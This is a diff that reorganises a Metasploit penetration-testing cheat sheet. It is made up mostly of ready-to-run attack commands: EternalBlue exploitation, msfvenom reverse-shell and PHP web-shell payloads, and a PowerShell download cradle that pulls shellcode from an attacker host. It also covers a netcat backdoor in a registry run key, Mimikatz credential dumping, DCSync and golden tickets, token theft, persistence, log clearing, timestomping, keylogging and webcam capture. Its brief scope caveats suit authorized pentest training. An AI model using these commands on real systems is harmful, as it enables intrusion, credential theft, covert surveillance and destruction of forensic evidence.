@@ -1,488 +1,516 @@
 Metasploit
 
 
+# Overview
+
+MSF console workflow, msfvenom, Meterpreter, and common post modules. Windows privesc, credential dumping, lateral movement, and AD attacks are summarized here — companion files hold non-MSF techniques.
+
+
+# Related Notes
+
+databases.txt            MSF auxiliary modules for MSSQL and Oracle
+windows-privesc.txt      Native privesc tools beyond getsystem
+windows-credentials.txt  Mimikatz, LSASS, and hash handling detail
+windows-lateral.txt      impacket-psexec and RDP after creds
+active-directory.txt     AD recon outside Meterpreter
+ad-attacks.txt           Kerberos and DC attack paths
+pwk.txt                  Lab exploit fundamentals
+
+
+# Contents
+
+Startup, Search and Exploit Workflow, msfvenom, Sessions and Handler, Meterpreter, Privilege Escalation, Enumeration, Credentials, Tokens, Persistence, Lateral Movement, Pivoting, Active Directory, Cross-Platform Delivery, Database, Misc
+
+
 # Startup
 
-msfdb init                                                  Start postgresql and initialize the db
-msfconsole                                                  Start Metasploit
-db_status                                                   Show the current data service status
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Overview
 
-# Troubleshooting
+Initialize the MSF database before importing scan results or using workspace features.
 
-- If the db connection fails
-exit
-cat /usr/share/metasploit-framework/config/database.yml
-Copy the password.
+## Commands
 
-su postgres
-createuser msf -P
-Enter password for new role:
-Enter it again:
+    msfdb init
+    msfconsole
+    db_status
 
-psql
-CREATE DATABASE msf;
-GRANT ALL PRIVILEGES ON DATABASE msf to msf;
-ALTER DATABASE msf OWNER TO msf;
-\q
-exit
+Database connection failure:
+    cat /usr/share/metasploit-framework/config/database.yml
+    # align postgres msf user/password with database.yml, then:
+    service postgresql restart
+    msfdb init
+    msfconsole
 
-service postgresql restart
-msfdb init
-msfconsole
-db_status
+Slow search warning (deprecated cache):
+    db_rebuild_cache
 
-- Module database cache not built yet, using slow search
-db_rebuild_cache                                            Rebuilds the database-stored module cache (deprecated)
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Help:
+    help
+    <command> -h
+    grep -h
 
-# Help
+## Validation / False Positives
 
-help or ?                                                   Show commands and their descriptions
-<command> -h                                                Get help on any command
-grep -h                                                     Show help on the 'grep' command
-------------------------------------------------------------------------------------------------------------------------------------------------------
+db_status failing at launch blocks db_import and workspace — fix postgres before scanning workflows.
+Module paths change between Framework versions — verify with search before scripting resource files.
 
-# Searching
 
-search <string>                                             Searches module names and descriptions
-search ms17                                                 Show all Microsoft exploits relative to 2017
+# Search and Exploit Workflow
 
-grep <string> search <type>
-grep php search payloads                                    Search payloads and grep for php
-grep linux show post                                        Search post exploitation modules and grep for linux
-grep -v gather search post/windows
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Overview
 
-# Basic usage
+Find a module, configure target and payload, run exploit. Example uses EternalBlue.
 
-show <all, auxiliary, encoders, exploits, nops, options, payloads, plugins, post>
+## Commands
 
-use <auxiliary, encoder, exploit, nop, payload, post>
+Search:
+    search <string>
+    search ms17
+    grep php search payloads
+    grep linux search post
+    grep -v gather search post/windows
 
-search eternalblue
-use exploit/windows/smb/ms17_010_eternalblue                Set the exploit module
-use <#>                                                     Or set the exploit module using the search result number
+Module selection:
+    show exploits
+    use exploit/windows/smb/ms17_010_eternalblue
+    use <#>                              # from search result number
+    show info
 
-show info                                                   Show basic info on the exploit
-set rhost <target IP>                                       Set the target IP
+Target and payload:
+    set rhost <target IP>
+    show payloads
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost <attacker IP>
+    set lport 443
+    show options
+    show targets
+    exploit
 
-show payloads                                               Show payloads that work with this exploit
-set payload windows/x64/meterpreter/reverse_tcp             Set the payload module
-set payload <#>                                             Or set the payload module using the search result number
+Globals (optional):
+    setg lhost <attacker IP>
 
-show options                                                Show remaining options for the payload
-set lhost <attacker IP>                                     Set to the attacker's IP
-set lport <attacker port>                                   Set to the attacker's listening port to 443
+## Validation / False Positives
 
-show targets                                                Show target options
-show advanced                                               Show advanced options
-show evasion                                                Show evasion options
-exploit                                                     Run the exploit
+EternalBlue succeeding only on unpatched SMBv1 hosts — document KB and patch state.
+Wrong payload arch (x86 vs x64) gives silent failure or crash — match show targets output.
 
-This particular exploit will drop you into a meterpreter session running at NT AUTHORITY\SYSTEM.
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Generate payloads
+# msfvenom
 
-msfvenom -h                                                 Show help
-msfvenom --list <archs, encoders, formats, platforms>       Show supported options
+## Overview
 
-msfvenom -p <payload variable=value> -f <format> -e <encoder> -a <arch> --platform <OS platform> -o <output file>
+Generate standalone payloads and staged shellcode outside msfconsole.
 
-- Generate a bind payload that avoids a bad characters
-msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A\x0D\xFF'
+## Commands
 
-- Generate a bind payload and encode it 3 times
-msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+    msfvenom -h
+    msfvenom --list formats
 
-- Inject a bind payload into calc.exe and save it as an executable
-msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
+Template:
+    msfvenom -p <payload> LHOST=<attacker IP> LPORT=443 -f <format> -o <output>
 
-- Generate a reverse payload and save it as an executable
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 --platform windows -o $HOME/evil64.exe
+Examples:
+    msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A\x0D\xFF'
+    msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+    msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=443 \
+        -f exe -a x86_64 --platform windows -o $HOME/evil64.exe
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=443 \
+        -f raw -e php/base64 -o $HOME/webshell.php
 
-- Generate PHP web shell and upload to a web server
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f raw -a php -e php/base64 -o $HOME/webshell.php
-upload $HOME/webshell.php /var/www/
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Validation / False Positives
 
-# Sessions
+Badchar detection failing still leaves broken shellcode — test payload in lab before delivery.
+Injected executables (-x calc.exe) trigger AV on upload — stage via HTTP or encrypt per engagement rules.
 
-sessions -h                                                 Show help on the sessions command
-sessions -l                                                 Show active sessions
-sessions -i 2                                               Interact with session 2
-ctrl z                                                      Background the current session
 
-Many options allow specifying session ranges using commas and dashes. For example:
-  sessions -s checkvm -i 1,3-6
-  sessions -k 1-3,6                                         Terminate sessions
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Sessions and Handler
+
+## Overview
+
+Manage multiple Meterpreter shells and keep handlers running for staged payloads.
+
+## Commands
+
+Sessions:
+    sessions -l
+    sessions -i <id>
+    sessions -k 1-3,6
+    # ctrl+z backgrounds current session
+
+Handler (catch reverse payloads):
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <attacker IP>
+    set lport 443
+    set ExitOnSession false
+    exploit -j -z
+
+## Validation / False Positives
+
+Handler on wrong interface (127.0.0.1 vs tun0) shows session died immediately — confirm LHOST matches callback path.
+Duplicate handlers on the same port fail silently — use jobs -l to inspect.
+
 
 # Meterpreter
 
-You will need to be at a Meterpreter prompt (meterpreter >) instead of a Metasploit prompt (msf >)
+## Overview
 
-help
-background                                                  Send the current session to the background, and return to the 'msf' prompt
+Interactive post-exploitation shell. Prompt is meterpreter >, not msf >.
 
-cat <file>                                                  Show the contents of a file
-edit <file>                                                 Edit the contents of a file using vim
-execute -f cmd.exe -i -H                                    Run a command on the target
+## Commands
 
-cd                                                          Change directory
-ls                                                          List directory
-pwd                                                         Print working directory
+Core:
+    sysinfo
+    getuid
+    ps
+    migrate <PID>
+    execute -f cmd.exe -i -H
+    shell
+    background
 
-lcd                                                         Change the local directory
-lpwd                                                        Print the local working directory
+Filesystem:
+    pwd
+    ls
+    cd
+    cat <file>
+    download c:\\boot.ini
+    upload <local> c:\\windows\\temp\\
+    search -f <file>
 
-download c:\\boot.ini                                       Download a file from the target (use double back slashes)
-upload evil.exe c:\\windows\\system32                       Upload a file to the target (use double back slashes)
+Network:
+    ipconfig
 
-clearev                                                     Clear the Application, System, and Security logs on a Windows target
-getuid                                                      Show the user that Meterpreter is running as
-hashdump                                                    Dump the SAM database
-idletime                                                    Show the number of seconds the user on the target has been idle
-ipconfig                                                    Show the network interfaces and addresses on the target
-migrate                                                     Migrate to another process
-ps                                                          Show running processes
-resource                                                    Execute Meterpreter instructions in a file
-search -f <file>                                            Locate files on the target
-shell                                                       Drop to a standard shell on the target
-webcam_list                                                 Show currently available web cams
-webcam_snap                                                 Takes a picture from the web cam
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Process and evasion:
+    hashdump
+    clearev
+    idletime
+    resource <file.rc>
 
-# Initial post exploitation - Windows
+## Validation / False Positives
 
-sysinfo                                                     Gets information about the remote system, such as OS
-getuid                                                      Get the user that the server is running as
-ps                                                          List running processes
-                                                            Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
-migrate <PID>                                               Migrate to that process using its PID
+hashdump requires SYSTEM and accessible SAM — fails on modern cred guard without migration.
+migrate to wrong arch process crashes session — match x86/x64 to payload.
 
-execute -H -f notepad                                       Start notepad
-migrate <notepad PID>                                       Migrate to notepad
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Privilege escalation - Windows
+# Privilege Escalation
 
-- Option 1
-use priv                                                    Load the priv extensions
-getprivs                                                    Attempt to enable all privileges available to the current process
-getsystem                                                   Use a number of different techniques to attempt to gain SYSTEM level privileges
-getuid                                                      Check to see if priv esc worked
-background                                                  If this fails, background the current session and try other options
-use exploit/windows/local/<tab>                             Show available Windows local exploits
+## Overview
 
-- Option 2
-use post/windows/escalate/getsystem
-set session 1
-run
+Escalate from user to SYSTEM inside Meterpreter. See windows-privesc.txt for SharpUp, Seatbelt, and manual paths.
 
-- Option 3
-use post/multi/recon/local_exploit_suggester
-set session 1
-run
+## Commands
 
-- Option 4
-use post/windows/escalate/droplnk
-set session 1
-set payload windows/meterpreter/reverse_tcp
-set lhost <attacker IP>
-set lport 444                                               This MUST be a different port from what was used in the original exploit
-exploit
-getuid                                                      Check to see if priv esc worked
+In-session:
+    getsystem
+    getuid
 
-- Option 5
-use exploit/windows/local/bypassuac
-set session 1
-set payload windows/meterpreter/reverse_tcp
-set lhost <attacker IP>
-set lport 444                                               This MUST be a different port from what was used in the original exploit
-exploit
-getuid                                                      Check to see if priv esc worked
+Post modules (set session <id>):
+    use post/windows/escalate/getsystem
+    run
 
-- Option x
-use exploit/windows/local/service_permissions
+    use post/multi/recon/local_exploit_suggester
+    run
 
-- Option x
-use exploit/windows/local/trusted_service_path
+Bypass UAC (new handler on different LPORT):
+    use exploit/windows/local/bypassuac
+    set session <id>
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <attacker IP>
+    set lport 444
+    exploit
 
-- Option x
-use exploit/windows/local/ppr_flatten_rec
+Additional local modules to try:
+    exploit/windows/local/service_permissions
+    exploit/windows/local/trusted_service_path
+    exploit/windows/local/ms_ndproxy
+    post/windows/escalate/unmarshal_cmd_exec
 
-- Option x
-use exploit/windows/local/ms_ndproxy
+## Validation / False Positives
 
-- Option x
-use post/windows/escalate/ms10_073_kbdlayout
-set session 1
-run
+getsystem failing on patched Server 2019+ is expected — use exploit_suggester output, not guesswork.
+UAC bypass spawns a second session — use a different LPORT and confirm getuid before reporting.
 
-- Option x
-use post/windows/escalate/unmarshal_cmd_exec                Creates a new user account, example username = EpLACMszKRJJh, password = whfzxba
-set session 1
-run
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Windows enumeration
+# Enumeration
 
-run post/windows/gather/enum_domain                         Identify the primary domain via the registry
-run post/windows/gather/enum_domains                        Enumerate the domains a host can see and the domain controllers for that domain
-run post/windows/gather/enum_logged_on_users                Enumerate current and recently logged on Windows users
-run post/windows/gather/enum_shares                         Enumerate configured and recently used file shares
+## Overview
 
-run killav
-run getcountermeasure
-run winenum
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Run gather scripts from an existing Windows session.
 
-# Dump creds
+## Commands
 
-run post/windows/gather/credentials/gpp
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    run post/windows/gather/enum_domain
+    run post/windows/gather/enum_domains
+    run post/windows/gather/enum_logged_on_users
+    run post/windows/gather/enum_shares
+    run post/windows/gather/credentials/gpp
+    run killav
+    run getcountermeasure
+    run winenum
 
-# Mimikatz
+## Validation / False Positives
 
-load kiwi                                                   Load Mimikatz
-help kiwi                                                   Show help
+GPP XML with encrypted passwords still needs the public AES key to decrypt — finding the file is step one.
+killav success is ephemeral — document what was stopped and whether it respawned.
 
-lsa_dump_sam                                                Dump LSA SAM
-lsa_dump_secrets                                            Dump LSA secrets
 
-password_change -u <user> -p <old password> -P <new password>
+# Credentials
 
-dcsync_ntlm krbtgt
-dcsync krbtgt 
+## Overview
 
-golden_ticket_create -d <domain> -u <user> -s <SID> -k
-kerberos_ticket_use /root/<domain>
-shell
+Dump credentials from Meterpreter via Kiwi (Mimikatz). Full offline handling in windows-credentials.txt.
 
-creds_all                                                   Dump hashes and credentials
+## Commands
 
-wifi_list                                                   Dump WiFi names and shared keys
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    load kiwi
+    help kiwi
+    creds_all
+    lsa_dump_sam
+    lsa_dump_secrets
+    dcsync_ntlm krbtgt
 
-# Steal tokens
+Advanced (authorized AD engagements):
+    golden_ticket_create -d <domain> -u <user> -s <SID> -k
+    kerberos_ticket_use /root/<ticket>
 
-use incognito
-list_tokens -u                                              List of tokens that are available
+## Validation / False Positives
 
-impersonate_token <domain>\\<user>                          Impersonate a domain account
-getuid
-rev2self                                                    Revert back to the original token
-getuid
+creds_all empty often means not SYSTEM or no interactive logon — migrate and retry after user activity.
+dcsync requires replication rights — failure is not proof DCSync is patched.
 
-impersonate_token "NT AUTHORITY\SYSTEM"                     Impersonate a local account
 
-ps                                                          Show running processes
-steal_token <PID>
-getuid
-drop_token                                                  Revert back to the original token
-getuid
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Tokens
 
-# Establish persistence
+## Overview
 
-Option 1
-run persistence -h
-run persistence <starts at computer startup> <tries to connect every 30s> <attacker port> <attacker IP>
-run persistence -X -i 30 -p 443 -r <attacker IP>
+Impersonate Windows tokens with incognito when you have a session but need another user's context.
 
-Notice that it shows where the file is stored on the Windows machine.
-It also gives you the location of the Meterpreter resource file you can run to remove persistence.
+## Commands
 
-Example
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 443
-set ExitOnSession false
-set AutoRunScript persistence -X -i 30 -p 443 -r <attacker IP>
-exploit -j -z
+    use incognito
+    list_tokens -u
+    impersonate_token <domain>\\<user>
+    impersonate_token "NT AUTHORITY\SYSTEM"
+    steal_token <PID>
+    getuid
+    rev2self
+    drop_token
 
-Option 2 - Add a user
-add_user <user> <password> -h <target IP>
-add_group_user "Domain Admins" <user> -h <target IP>
+## Validation / False Positives
 
-Option 3 - Scheduled
-info exploit/windows/local/s4u_persistence
+Token list showing a user does not mean impersonation succeeds — confirm getuid change.
+rev2self/drop_token before exit to avoid leaving elevated context in session logs.
 
-Notice the trigger methods: event, lock, logon, schedule, unlock
 
-use exploit/windows/local/s4u_persistence
-set session 1
-set TRIGGER lock
-exploit
+# Persistence
 
-Option 4 - Volume Shadow Copy
-use exploit/windows/local/vss_persistence
-set session 1
-set RHOST <target IP>
-set LPORT 4445  <———use a different port number
-exploit
+## Overview
 
-Option 5 - Upload netcat
-meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
+Maintain access after initial compromise. Use only with explicit scope approval.
 
-- If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
-This lets you automatically establish persistence, without having to think about it.
+## Commands
 
-Check for anything the runs at startup
-meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
+Meterpreter persistence:
+    run persistence -X -i 30 -p 443 -r <attacker IP>
+    # note cleanup resource path in output
 
-Add a registry key
-meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 443 -e cmd.exe'
+Handler with AutoRunScript:
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <attacker IP>
+    set lport 443
+    set ExitOnSession false
+    set AutoRunScript persistence -X -i 30 -p 443 -r <attacker IP>
+    exploit -j -z
 
-Verify changes to the registry
-meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat
+Scheduled (s4u):
+    use exploit/windows/local/s4u_persistence
+    set session <id>
+    set TRIGGER lock
+    exploit
 
-Reboot the target system
-meterpreter >  reboot
+Registry run key (example):
+    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run \
+        -v netcat -d "c:\\windows\\system32\\nc.exe -ldp 443 -e cmd.exe"
 
-Connect to target system - option 1
-Open a new Terminal: nc -vn <target IP> 443
+Linux SSH key (handler AutoRunScript):
+    set AutoRunScript post/linux/manage/sshkey_persistence
 
-Connect to target system - option 2
-use multi/handler
-set PAYLOAD windows/shell_bind_tcp
-set RHOST <target IP>
-exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Validation / False Positives
 
-# Upload tools
+persistence -X survives reboot but is noisy in autoruns and Defender — pair with cleanup steps in report.
+Registry persistence requires admin and survives until key removed — document exact key path.
 
-upload <local path> <remote path>
-upload /usr/share/windows-binaries/nc.exe c:\\
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Lateral movement
+# Lateral Movement
 
-use windows/smb/psexec
-set RHOST <target IP>
-set SMBUser <user>
-set SMBPass <password or hash>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <local IP>
-set LPORT <local port>
-exploit
+## Overview
 
-powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacker IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Spread from a compromised host using MSF psexec. See windows-lateral.txt for impacket and RDP.
+
+## Commands
+
+    use exploit/windows/smb/psexec
+    set rhost <target IP>
+    set smbuser <user>
+    set smbpass <password or hash>
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <attacker IP>
+    set lport 443
+    exploit
+
+PowerShell shellcode delivery:
+    powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://<attacker IP>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <attacker IP> -lport 443 -Force"
+
+## Validation / False Positives
+
+psexec requires admin on target and SMB reachable — 445 filtered is not a module failure to misconfigure.
+Pass-the-hash needs SMBPass in LM:NT or :NT format per module docs.
+
 
 # Pivoting
 
-run post/multi/manage/autoroute                             Add routes to all local subnets
-run arp_scanner -r 10.10.0.1/24
+## Overview
 
-use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.0.0.0/24
-set PORTS 445
-set THREADS 10
-run
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Route traffic through a session to scan internal subnets.
 
-# Post exploitation - domain controller (DC)
+## Commands
 
-run post/windows/gather/credentials/domain_hashdump         Attempts to copy the NTDS.dit database and parse
-                                                              out all of the User Accounts. It saves all of the
-                                                              captured password hashes, including historical ones
-run post/windows/gather/enum_ad_computers                   Windows Gather Active Directory Computers
-run post/windows/gather/enum_ad_groups                      Windows Gather Active Directory Groups
-run post/windows/gather/enum_ad_managedby_groups            Windows Gather Active Directory Managed Groups
-run post/windows/gather/enum_ad_service_principal_names     Windows Gather Active Directory Service Principal Names
-run post/windows/gather/enum_ad_to_wordlist                 Windows Active Directory Wordlist Builder
-run post/windows/gather/enum_ad_user_comments               Windows Gather Active Directory User Comments
-run post/windows/gather/enum_ad_users                       Windows Gather Active Directory Users
-run post/windows/gather/enum_domain_users                   Windows Gather Enumerate Active Domain Users
+    run post/multi/manage/autoroute
+    run arp_scanner -r <subnet>/<cidr>
 
-- Add any user in Active Directory
-use windows/manage/add_user_domain
-set addtodomain true
-set username hacker
-set password w00t!
-set session 1
-exploit
+    use auxiliary/scanner/portscan/tcp
+    set rhosts <subnet>/<cidr>
+    set ports 445
+    set threads 10
+    run
 
-- Delete any user in Active Directory
-use windows/manage/delete_user
-set username hacker
-set session 1
-exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Validation / False Positives
 
-# Cross platform exploit
+autoroute adding routes does not open new sessions — confirm scans hit rhosts through the pivot session.
+arp_scanner noise on large subnets may trip IDS — throttle threads in production.
 
-- Windows
-use exploit/multi/script/web_delivery
-set lhost <attacker IP>
-set lport <attacker port>
-show targets
-set target 2                                                Set the target language to PowerShell
-set payload windows/meterpreter/reverse_tcp
-exploit
 
-- Linux and OS X
-use exploit/multi/script/web_delivery
-set lhost <attacker IP>
-set lport <attacker port>
-set target 0                                                Set the target language to Python
-set payload python/meterpreter/reverse_tcp
-exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Active Directory
 
-# Misc
+## Overview
 
-idletime                                                    Number of seconds the remote user has been idle
+Enumerate AD and dump hashes from a privileged session. Kerberos attacks and BloodHound in ad-attacks.txt and ad-bloodhound.txt.
 
-If time < 5 min
-keyscan_start                                               Start capturing keystrokes
-keyscan_stop                                                Stop capturing keystrokes
-keyscan_dump                                                Dump the keystroke buffer
+## Commands
 
-screenshot                                                  Grab a screenshot of the interactive desktop
+Gather modules:
+    run post/windows/gather/credentials/domain_hashdump
+    run post/windows/gather/enum_ad_users
+    run post/windows/gather/enum_ad_computers
+    run post/windows/gather/enum_ad_groups
+    run post/windows/gather/enum_ad_service_principal_names
+    run post/windows/gather/enum_domain_users
 
-timestomp                                                   Manipulate file MACE attributes
+Manage users:
+    use windows/manage/add_user_domain
+    set addtodomain true
+    set username <user>
+    set password <password>
+    set session <id>
+    exploit
 
-run vnc                                                     If the screen is locked exit VNC
-run screen_unlock
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    use windows/manage/delete_user
+    set username <user>
+    set session <id>
+    exploit
+
+## Validation / False Positives
+
+domain_hashdump needs SYSTEM on a DC or DCSync rights — document which path succeeded.
+add_user_domain creating Domain Admins membership is destructive — scope only.
+
+
+# Cross-Platform Delivery
+
+## Overview
+
+Deliver payloads via web_delivery when you have code execution in a script interpreter.
+
+## Commands
+
+Windows (PowerShell):
+    use exploit/multi/script/web_delivery
+    set lhost <attacker IP>
+    set lport 443
+    set target 2
+    set payload windows/meterpreter/reverse_tcp
+    exploit
+
+Linux (Python):
+    use exploit/multi/script/web_delivery
+    set lhost <attacker IP>
+    set lport 443
+    set target 0
+    set payload python/meterpreter/reverse_tcp
+    exploit
+
+## Validation / False Positives
+
+Target must fetch and execute the returned one-liner — blocked egress or constrained language mode breaks delivery.
+Python meterpreter is limited compared to Windows — confirm session capabilities before post modules.
+
 
 # Database
 
-db_import <file>                                            Import a scan result file (filetype will be auto-detected)
-db_export -f <xml or pwdump> <file>                         Export a file containing the contents of the database
+## Overview
 
-workspace                                                   List workspaces (* shows the active workspace)
-* default
-  client1
-  client2
+Import nmap results, organize engagements by workspace, and query discovered services.
 
-workspace client1                                           Switch workspace
+## Commands
 
-workspace                                                   List workspaces
-  default
-* client1                                                   * shows the active workspace
-  client2
+Import and export:
+    db_import <scan file>
+    db_export -f xml <file>
 
-workspace -a <name>                                         Add workspace(s)
-workspace -d <name>                                         Delete workspace(s)
-workspace -D                                                Delete all workspaces
-workspace -r <old> <new>                                    Rename workspace
+Workspaces:
+    workspace -a <name>
+    workspace <name>
+    workspace -d <name>
+    workspace -r <old> <new>
 
-creds                                                       List all credentials in the database
-hosts                                                       List all hosts in the database
-loot                                                        List all loot in the database
-notes                                                       List all notes in the database
-services                                                    List all services in the database
-vulns                                                       List all vulnerabilities in the database
+Query:
+    hosts
+    services
+    creds
+    loot
+    vulns
+    services -p 22 --rhosts
+    services -s http
+    hosts -d <IP>
 
-services -c port,protocol,name                              Show specific columns
-services -p 22                                              Search for hosts with a specific port open
-services -p 22 --rhosts                                     Search for hosts with a specific port open, and add those hosts to rhosts
-services -s http                                            Search for hosts with a specific service running
+## Validation / False Positives
 
-hosts -d <IP>                                               Delete a host from the database
+db_import without workspace isolation mixes client data — use per-engagement workspaces.
+services --rhosts populates RHOSTS globally — verify scope before mass exploit attempts.
+
+
+# Misc
+
+## Overview
+
+Collection and desktop interaction from Meterpreter. High sensitivity — scope only.
+
+## Commands
+
+    idletime
+    keyscan_start
+    keyscan_dump
+    keyscan_stop
+    screenshot
+    timestomp
+    run vnc
+    run screen_unlock
+    webcam_list
+    webcam_snap
+
+## Validation / False Positives
+
+keyscan and webcam require active user session and may fail on locked desktops — screenshot first to confirm context.
+timestomp alters forensic timelines — document original MACE if reporting integrity findings.
